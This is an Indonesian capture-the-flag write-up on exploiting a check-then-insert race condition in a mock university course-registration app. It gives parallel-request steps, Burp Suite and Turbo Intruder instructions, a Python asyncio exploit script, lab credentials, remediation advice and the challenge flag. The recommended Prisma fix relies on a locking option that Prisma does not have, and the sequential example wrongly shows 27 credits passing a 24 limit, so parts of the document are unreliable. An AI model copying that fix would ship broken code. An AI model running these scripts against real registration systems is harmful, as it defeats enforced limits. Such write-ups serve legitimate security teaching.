# WRITEUP: SIAK Next Gen - Race Condition CTF Challenge

## Challenge Objective

Mendapatkan flag dengan mengeksploitasi race condition pada sistem registrasi IRS (Isian Rencana Studi) untuk mendaftar pada mata kuliah rahasia **CSCTF999 - Seminar Khusus Keamanan Nasional**.

---

## Vulnerability Explanation

### Root Cause

Endpoint `POST /api/irs/add` memiliki **Time-of-Check Time-of-Use (TOCTOU)** vulnerability. Backend melakukan pengecekan batas SKS sebelum insert data, namun operasi ini **tidak atomic** dan **tidak menggunakan locking**.

### Kode Vulnerable (src/app/api/irs/add/route.ts)

```typescript
// 1. Baca current SKS (tanpa lock)
const currentEnrollments = await prisma.enrollment.findMany({
  where: { userId: user.id, status: "ENROLLED" },
  include: { course: true },
});
const currentSKS = currentEnrollments.reduce((sum, e) => sum + e.course.credits, 0);

// 2. Validasi batas (tanpa transaksi)
if (currentSKS + course.credits > maxSKS) {
  return NextResponse.json({ error: "SKS limit exceeded" }, { status: 400 });
}

// 3. Insert (terpisah dari validasi)
await prisma.enrollment.create({
  data: { userId: user.id, courseId, status: "ENROLLED" },
});
```

### Masalah

Antara langkah 1-2 dan langkah 3, **request lain yang berjalan secara paralel** juga membaca nilai `currentSKS` yang **sama** (belum berubah karena insert belum terjadi). Akibatnya, multiple request bisa lolos validasi dan melakukan insert, sehingga total SKS akhir melebihi batas maksimal.

### Contoh Skenario

```
State awal: currentSKS = 18, maxSKS = 24

Request A (tambah 6 SKS):  baca currentSKS = 18,  18+6=24 ≤ 24 ✓ → insert
Request B (tambah 3 SKS):  baca currentSKS = 18,  18+3=21 ≤ 24 ✓ → insert  
Request C (tambah 3 SKS):  baca currentSKS = 18,  18+3=21 ≤ 24 ✓ → insert

State akhir: 18 + 6 + 3 + 3 = 30 SKS (MELEBIHI BATAS!)
```

---

## Why Frontend Protections Fail

Frontend menonaktifkan tombol "Tambah" ketika `currentSKS + course.credits > maxSKS`:

```typescript
const canAddMore = user.currentSKS < user.maxSKS;
// Tombol disabled ketika !canAddMore
```

Namun, proteksi ini hanya **client-side**. Seorang attacker dapat:

1. Mengirim request HTTP langsung ke API (melewati frontend)
2. Memanipulasi nilai disabled pada DOM
3. Menggunakan tools seperti Burp Suite, cURL, atau script Python

---

## How Race Condition Works

Race condition terjadi ketika dua atau lebih operasi concurrent mengakses shared resource (database) tanpa sinkronisasi yang memadai.

### Flow Normal (Sequential)

```
Request 1 → Read SKS (18) → Validate (pass) → Insert → SKS becomes 21
Request 2 → Read SKS (21) → Validate (pass) → Insert → SKS becomes 24
Request 3 → Read SKS (24) → Validate (pass) → Insert → SKS becomes 27
```

### Flow dengan Race Condition (Concurrent)

```
Request 1 → Read SKS (18) → Validate (pass) → ░ (menunggu) ░ → Insert
Request 2 → Read SKS (18) → Validate (pass) → ░ (menunggu) ░ → Insert
Request 3 → Read SKS (18) → Validate (pass) → ░ (menunggu) ░ → Insert
                                       ↓
                              Semua request membaca 18
                                       ↓
                              Semua request lolos validasi
                                       ↓
                              Semua request melakukan insert
                                       ↓
                              Final SKS: 18 + 6 + 3 + 3 = 30
```

---

## Exact Exploitation Steps

### Step 1: Login

Login sebagai mahasiswa dengan kredensial:

- **Email:** mahasiswa@student.ui.ac.id
- **Password:** password123

### Step 2: Dapatkan Session Cookie

Setelah login, browser akan menyimpan cookie `token` (httpOnly JWT).

### Step 3: Kirim Parallel Requests

Kirim multiple request `POST /api/irs/add` secara bersamaan untuk menambahkan beberapa mata kuliah sekaligus.

**Target Courses:**
- CSCTF999 (6 SKS) - Seminar Khusus Keamanan Nasional (hidden course)
- CSIM401 (3 SKS) - mata kuliah tambahan
- CSGE602 (3 SKS) - mata kuliah tambahan
- CSCM777 (3 SKS) - mata kuliah tambahan

### Step 4: Overload SKS

Setelah parallel requests, total SKS akan melebihi batas (misalnya 30 SKS).

### Step 5: Drop Mata Kuliah Dummy

Hapus MK000 - Olahraga Prestasi (6 SKS) melalui endpoint drop atau tombol Drop di UI.

```
Total SKS sebelum drop: 30
Drop MK000 (6 SKS)
Total SKS setelah drop: 24 ✓ (≤ maksimal 24)
```

### Step 6: Submit IRS

Submit IRS melalui tombol "Submit IRS" di halaman IRS atau langsung ke endpoint.

### Step 7: Akses Hidden Course

Buka halaman detail CSCTF999 di `/courses/<course-id>`.

### Step 8: Dapatkan Flag

Flag akan ditampilkan pada halaman detail mata kuliah CSCTF999.

---

## Burp Suite Instructions

### 1. Login dan Capture Request

1. Buka Burp Suite dan konfigurasi proxy (127.0.0.1:8080)
2. Login ke aplikasi melalui browser dengan proxy Burp
3. Temukan request login dan kirim ke Repeater

### 2. Kirim Parallel Requests

1. Intercept request POST `/api/irs/add` dengan body `{"course_id": "<course-id-1>"}`
2. Kirim ke Repeater
3. Buat tab baru untuk setiap mata kuliah yang akan ditambahkan
4. Gunakan fitur **Send Group (Parallel)** di Burp Suite Repeater

**Konfigurasi Tab:**
- **Tab 1:** `POST /api/irs/add` Body: `{"courseId": "<CSCTF999-course-id>"}`
- **Tab 2:** `POST /api/irs/add` Body: `{"courseId": "<course-id-2>"}`
- **Tab 3:** `POST /api/irs/add` Body: `{"courseId": "<course-id-3>"}`

5. Klik kanan → **Send Group** → **Send in parallel**

### 3. Validasi

Periksa response dari setiap request. Jika semua mengembalikan `{"success": true}`, maka race condition berhasil dieksploitasi.

---

## Turbo Intruder Example

Berikut adalah script Python untuk Turbo Intruder:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=10,
                           pipeline=False)

    # Ganti dengan courseId masing-masing
    requests = [
        '{"courseId": "ID_CSCTF999"}',
        '{"courseId": "ID_COURSE_2"}',
        '{"courseId": "ID_COURSE_3"}',
        '{"courseId": "ID_COURSE_4"}',
    ]

    for body in requests:
        engine.queue(target.req, body)

def handleResponse(req, interesting):
    if 'success' in req.response:
        table.add(req)
```

## Python Script (Alternative to Burp)

```python
import asyncio
import aiohttp

COOKIE = "token=<your-jwt-token>"
BASE_URL = "http://localhost:3000"

async def add_course(session, course_id):
    async with session.post(
        f"{BASE_URL}/api/irs/add",
        json={"courseId": course_id},
        cookies={"token": COOKIE}
    ) as resp:
        return await resp.json()

async def main():
    course_ids = [
        "ID_CSCTF999",
        "ID_COURSE_2",
        "ID_COURSE_3",
    ]

    async with aiohttp.ClientSession() as session:
        tasks = [add_course(session, cid) for cid in course_ids]
        results = await asyncio.gather(*tasks)

        for i, result in enumerate(results):
            print(f"Course {i}: {result}")

asyncio.run(main())
```

---

## Request Examples

### Login

```
POST /api/auth/login
Content-Type: application/json

{
    "email": "mahasiswa@student.ui.ac.id",
    "password": "password123"
}
```

### Add Course (Vulnerable)

```
POST /api/irs/add
Cookie: token=<jwt>
Content-Type: application/json

{
    "courseId": "clx...course-id..."
}
```

### Drop Course

```
POST /api/irs/drop
Cookie: token=<jwt>
Content-Type: application/json

{
    "courseId": "clx...course-id..."
}
```

### Submit IRS

```
POST /api/irs/submit
Cookie: token=<jwt>
```

### Check IRS Status

```
GET /api/irs/status
Cookie: token=<jwt>
```

---

## How to Get the Course IDs

1. Login ke aplikasi
2. Akses `/api/courses` (memerlukan cookie)
3. Dapatkan ID dari setiap course
4. CSCTF999 akan muncul dengan `isHidden: true`

---

## Root Cause Analysis

### Prisma ORM Issues

Prisma ORM secara default tidak menggunakan transaksi untuk operasi terpisah. Setiap query adalah operasi individual:

```typescript
// Tanpa transaksi - VULNERABLE
const currentSKS = await getCurrentSKS(user.id);
// Gap: request lain bisa mengubah data di sini
if (currentSKS + course.credits > maxSKS) { /* check */ }
// Gap: request lain bisa mengubah data di sini
await createEnrollment(user.id, courseId);
```

### Recommended Fix

```typescript
// Dengan transaksi + locking - FIXED
await prisma.$transaction(async (tx) => {
  const enrollments = await tx.enrollment.findMany({
    where: { userId: user.id, status: "ENROLLED" },
    include: { course: true },
    lock: { mode: "pessimistic" }, // Row-level locking
  });

  const currentSKS = enrollments.reduce((sum, e) => sum + e.course.credits, 0);

  if (currentSKS + course.credits > maxSKS) {
    throw new Error("SKS limit exceeded");
  }

  await tx.enrollment.create({
    data: { userId: user.id, courseId, status: "ENROLLED" },
  });
});
```

---

## Remediation Guidance

### 1. Gunakan Database Transactions

Bungkus operasi read-check-write dalam satu transaksi database.

### 2. Implement Pessimistic Locking

Gunakan `SELECT ... FOR UPDATE` untuk mengunci baris yang dibaca.

### 3. Gunakan Atomic Operations

Jika memungkinkan, lakukan validasi dan update dalam satu query SQL:

```sql
INSERT INTO enrollment (user_id, course_id, status)
SELECT $1, $2, 'ENROLLED'
WHERE (
    SELECT COALESCE(SUM(c.credits), 0) + $3
    FROM enrollment e
    JOIN courses c ON e.course_id = c.id
    WHERE e.user_id = $1 AND e.status = 'ENROLLED'
) <= $4;
```

### 4. Validasi di Application Layer dengan Lock

Gunakan mutex atau distributed lock untuk serialisasi akses.

### 5. Defense in Depth

- Validasi frontend (UX)
- Validasi backend dengan locking
- Audit log untuk mendeteksi anomali
- Rate limiting pada endpoint kritis

---

## Flag

```
CTF{race_condition_in_academic_workflow}
```
